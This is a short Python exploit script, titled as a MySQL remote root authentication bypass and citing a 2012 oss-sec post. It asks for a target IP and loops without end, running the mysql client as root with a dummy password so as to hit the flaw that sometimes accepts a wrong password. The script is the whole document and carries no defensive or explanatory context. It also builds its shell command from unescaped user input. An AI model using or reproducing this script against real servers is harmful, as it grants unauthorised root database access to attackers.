#!/usr/bin/python

# MySQL Remote Root Auth Bypass
# seclists.org/oss-sec/2012/q2/493

import subprocess

ipaddr = raw_input("Enter the IP of mysql server: ")

while 1:
    subprocess.Popen("mysql --host=%s -u root mysql --password=blah" % (ipaddr), shell=True).wait()
